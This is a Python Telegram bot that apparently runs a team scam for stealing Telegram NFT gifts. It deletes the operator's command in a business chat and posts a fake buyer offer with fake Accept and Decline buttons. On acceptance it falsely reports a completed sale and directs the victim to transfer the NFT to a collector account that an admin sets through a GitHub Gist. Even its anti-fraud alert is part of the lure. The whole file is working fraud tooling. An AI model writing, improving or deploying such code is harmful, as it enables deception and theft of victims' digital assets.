import asyncio
import os
import re
import random
import string
import json
import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
from aiogram.exceptions import TelegramBadRequest

BOT_TOKEN = os.getenv("BOT_TOKEN")
GIST_ID = os.getenv("GIST_ID")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0)) # Твой ID из секретов

DEFAULT_TARGET = "Gifts_Replayer"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_users = set()

MESSAGES = {
    "ru": {
        "offer": "Пользователь ({username})\nпредлагает вам\n<b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успешно продан!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зачисления звёзд.",
        "declined": "❌ Оффер на <b>{amount} {symbol}</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен.",
        "btn_accept": "Принять",
        "btn_decline": "Отклонить",
        "btn_transfer": "Передать NFT"
    },
    # ... (остальные языки такие же, я пропущу для краткости, они есть в полном коде ниже)
}

# Добавим остальные языки для полноты
MESSAGES.update({
    "en": {
        "offer": "User ({username})\noffers you\n<b>{amount} {symbol}</b> for the gift <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> successfully sold!\n\n• Transfer to <a href='https://t.me/{target_username}'>@{target_username}</a> to receive stars.",
        "declined": "❌ Offer of <b>{amount} {symbol}</b> for <a href='{link}'>{pretty_name}</a> declined.",
        "btn_accept": "Accept",
        "btn_decline": "Decline",
        "btn_transfer": "Transfer NFT"
    },
    "ua": {
        "offer": "Користувач ({username})\nпропонує вам\n<b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> успішно продано!\n\n• Передайте <a href='https://t.me/{target_username}'>@{target_username}</a> для зарахування зірок.",
        "declined": "❌ Офер на <b>{amount} {symbol}</b> за подарунок <a href='{link}'>{pretty_name}</a> відхилено.",
        "btn_accept": "Прийняти",
        "btn_decline": "Відхилити",
        "btn_transfer": "Передати NFT"
    },
    "ar": {
        "offer": "المستخدم ({username})\nيعرض عليك\n<b>{amount} {symbol}</b> مقابل الهدية <a href='{link}'>{pretty_name}</a>.",
        "success": "🎁 <a href='{link}'>{pretty_name}</a> تم بيعه بنجاح!\n\n• قم بالتحويل إلى <a href='https://t.me/{target_username}'>@{target_username}</a> لاستلام النجوم.",
        "declined": "❌ تم رفض العرض بمبلغ <b>{amount} {symbol}</b> مقابل <a href='{link}'>{pretty_name}</a>.",
        "btn_accept": "قبول",
        "btn_decline": "رفض",
        "btn_transfer": "نقل NFT"
    }
})

def get_pretty_name(slug):
    raw_name = slug.split('-')[0]
    return re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)

# --- РАБОТА С GIST (БАЗА ДАННЫХ) ---
async def get_gist_data():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    url = f"https://api.github.com/gists/{GIST_ID}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                content = data['files']['config.json']['content']
                return json.loads(content) if content else {}
    return {}

async def update_gist_data(new_data: dict):
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    url = f"https://api.github.com/gists/{GIST_ID}"
    payload = {
        "files": {
            "config.json": {
                "content": json.dumps(new_data, indent=2)
            }
        }
    }
    async with aiohttp.ClientSession() as session:
        async with session.patch(url, headers=headers, json=payload) as resp:
            return resp.status == 200

# --- АДМИН ПАНЕЛЬ ---
@dp.message(Command("set_target"))
async def cmd_set_target(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 3:
        await message.answer("❌ Формат: `/set_target <ID_пользователя> <юзернейм_без_@>`")
        return
    
    user_id, new_target = parts[1], parts[2].replace("@", "")
    
    data = await get_gist_data()
    data[user_id] = new_target
    
    if await update_gist_data(data):
        await message.answer(f"✅ Для пользователя `{user_id}` установлен новый получатель: `@{new_target}`")
    else:
        await message.answer("❌ Ошибка сохранения в GitHub Gist.")

@dp.message(Command("remove_target"))
async def cmd_remove_target(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        await message.answer("❌ Формат: `/remove_target <ID_пользователя>`")
        return
    
    user_id = parts[1]
    data = await get_gist_data()
    
    if user_id in data:
        del data[user_id]
        if await update_gist_data(data):
            await message.answer(f"✅ Для пользователя `{user_id}` сброшен на стандартный @{DEFAULT_TARGET}")
    else:
        await message.answer("❌ Пользователь не найден в базе.")

# --- ОСНОВНЫЕ КОМАНДЫ ---
@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    text = (
        "<b>Как начать:</b>\n"
        "Отправь /ofteam — и доступ будет выдан автоматически.\n\n"
        "<b>Как создать оффер:</b>\n"
        "Отправь команду в деловой чат с покупателем:\n"
        "<code>/of ССЫЛКА_НА_НФТ ЦЕНА ВАЛЮТА ЯЗЫК</code>\n\n"
        "<b>Примеры:</b>\n"
        "<code>/of t.me/nft/DurovsCap-1234 500 stars</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 10 gram en</code>\n"
        "<code>/of t.me/nft/DurovsCap-1234 250 stars ua</code>\n\n"
        "<b>Валюты:</b> stars / gram\n"
        "<b>Языки:</b> ru / en / ua / ar"
    )
    await message.answer(text, parse_mode="HTML")

@dp.message(Command("ofteam"))
async def cmd_ofteam(message: types.Message):
    await message.answer("✅ Доступ выдан. Теперь можно отправлять оферы.")

@dp.message(F.text.startswith("/of"))
async def block_offer_in_pm(message: types.Message):
    await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")

# --- ГЕНЕРАЦИЯ ОФФЕРА ---
@dp.business_message(F.text.startswith("/of"))
async def handle_offer_command(message: types.Message):
    business_connection_id = message.business_connection_id
    if not business_connection_id: return

    parts = message.text.split()
    if len(parts) < 4: return

    link = parts[1]
    if not link.startswith("http"): link = "https://" + link
    try:
        amount = int(parts[2])
    except ValueError:
        return
    
    currency = parts[3].lower()
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    lang = parts[4].lower() if len(parts) > 4 else "ru"
    if lang not in MESSAGES: lang = "ru"

    match = re.search(r"t\.me/nft/([a-zA-Z0-9_-]+-\d+)", link)
    if not match: return
    
    gift_slug = match.group(1)
    pretty_name = get_pretty_name(gift_slug)
    username = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
    msg_data = MESSAGES[lang]

    caption_text = msg_data["offer"].format(
        username=username, amount=amount, symbol=symbol, link=link, pretty_name=pretty_name,
        target_username=DEFAULT_TARGET
    )

    try:
        await bot.delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
        # В call_back_data передаем ID владельца бизнес-аккаунта, чтобы потом узнать его настройки
        sender_id = message.from_user.id if message.from_user else message.sender_chat.id
        keyboard = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text=msg_data["btn_decline"], callback_data=f"decline:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}"),
            InlineKeyboardButton(text=msg_data["btn_accept"], callback_data=f"accept:{gift_slug}:{amount}:{currency}:{lang}:{sender_id}")
        ]])
        await bot.send_message(
            chat_id=message.chat.id,
            text=caption_text,
            reply_markup=keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        )
    except Exception as e:
        print(f"Ошибка: {e}")

# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША И БАЗОЙ ДАННЫХ ---
@dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
async def handle_fake_buttons(callback: types.CallbackQuery):
    if not callback.message: return
    
    data_parts = callback.data.split(":")
    action, gift_slug, amount, currency, lang, sender_id = data_parts[0], data_parts[1], data_parts[2], data_parts[3], data_parts[4], data_parts[5]
    
    symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
    
    # Получаем кастомный юзернейм для этого пользователя из Gist
    data = await get_gist_data()
    target_username = data.get(sender_id, DEFAULT_TARGET)

    cache_buster = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    link = f"https://t.me/nft/{gift_slug}?v={cache_buster}"
    
    pretty_name = get_pretty_name(gift_slug)
    business_connection_id = callback.message.business_connection_id
    msg_data = MESSAGES.get(lang, MESSAGES["ru"])

    if action == "accept":
        new_text = msg_data["success"].format(
            link=link, pretty_name=pretty_name, target_username=target_username
        )
        new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
        ])
        alert_text = (
            "⚠️ Внимание!\n\n"
            "Получатель в этом сервисе:\n"
            f"@{target_username}.\n\n"
            "Если вас просят передать NFT напрямую другому пользователю — не отправляйте его. Это может быть мошенничество. Проверяйте условия оплаты."
        )
    else:
        new_text = msg_data["declined"].format(
            amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
        )
        new_keyboard = None
        alert_text = None

    try:
        await bot.edit_message_text(
            chat_id=callback.message.chat.id,
            message_id=callback.message.message_id,
            text=new_text,
            reply_markup=new_keyboard,
            business_connection_id=business_connection_id,
            parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(url=link, show_above_text=True, prefer_large_media=True)
        )
    except TelegramBadRequest as e:
        if "message is not modified" not in str(e).lower():
            print(f"Ошибка изменения: {e}")
    except Exception as e:
        print(f"Неизвестная ошибка: {e}")

    if alert_text:
        await callback.answer(alert_text, show_alert=True)
    else:
        await callback.answer()

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
